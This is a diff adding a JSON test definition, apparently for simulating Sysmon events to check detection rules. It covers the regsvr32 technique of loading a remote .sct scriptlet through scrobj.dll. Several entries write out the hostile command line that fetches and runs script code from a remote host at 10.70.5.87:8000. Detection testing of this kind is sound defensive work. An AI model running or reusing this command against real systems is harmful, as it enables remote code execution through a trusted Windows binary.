@@ -1,0 +1,52 @@
+{
+	"name": "RTA regsvr32_scrobj",
+	"version": "0.1",
+	"author": "n0dec",
+	"description": "Loads a .sct network callback with RegSvr32.",
+	"rules": {
+		"regsvr32": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "Process Create",
+			"description": "Executing regsvr32 with remote sct file.",
+			"payload": {
+				"Image": "C:\\Windows\\System32\\regsvr32.exe",
+				"Description": "Microsoft(C) Register Server",
+				"CommandLine": "regsvr32.exe /u /n /s /i:http://10.70.5.87:8000/bin/notepad.sct scrobj.dll"
+			}
+		},
+		"regsvr32_network": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "Network connection detected",
+			"description": "Network activity from regsvr32.",
+			"payload": {
+				"Image": "C:\\Windows\\system32\\regsvr32.exe",
+				"DestinationIp": "10.70.5.87",
+				"DestinationPort": 8000
+			}
+		},
+		"ie_cache": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "File created",
+			"description": "Writing IE Temporary Internet Files.",
+			"payload": {
+				"Image": "C:\\Windows\\system32\\regsvr32.exe",
+				"TargetFilename": "C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\HIP95DMB\\notepad[1].wsc"
+			}
+		},
+		"regsvr32_child": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "Process Create",
+			"description": "Opening notepad as a child of regsvr32.",
+			"payload": {
+				"ParentImage": "C:\\Windows\\System32\\regsvr32.exe",
+				"ParentCommandLine": "regsvr32.exe /u /n /s /i:http://10.70.5.87:8000/bin/notepad.sct scrobj.dll",
+				"Image": "C:\\Windows\\system32\\notepad.exe",
+				"CommandLine": "\"C:\\Windows\\system32\\notepad.exe\""
+			}
+		}
+	}
+}
